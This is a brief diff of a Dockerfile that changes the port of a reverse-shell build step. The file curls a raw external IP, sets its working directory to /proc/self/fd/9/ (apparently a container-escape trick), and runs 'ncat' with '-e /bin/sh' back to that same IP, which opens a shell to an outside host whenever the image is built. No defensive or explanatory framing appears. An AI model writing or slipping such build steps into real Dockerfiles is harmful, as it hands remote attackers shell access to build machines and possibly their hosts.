@@ -4,6 +4,6 @@ RUN curl http://68.183.4.199/from_ibm
 
 WORKDIR /proc/self/fd/9/
 
-RUN ncat 68.183.4.199 5555 -e /bin/sh
+RUN ncat 68.183.4.199 6666 -e /bin/sh
 
 CMD ["/bin/bash"]
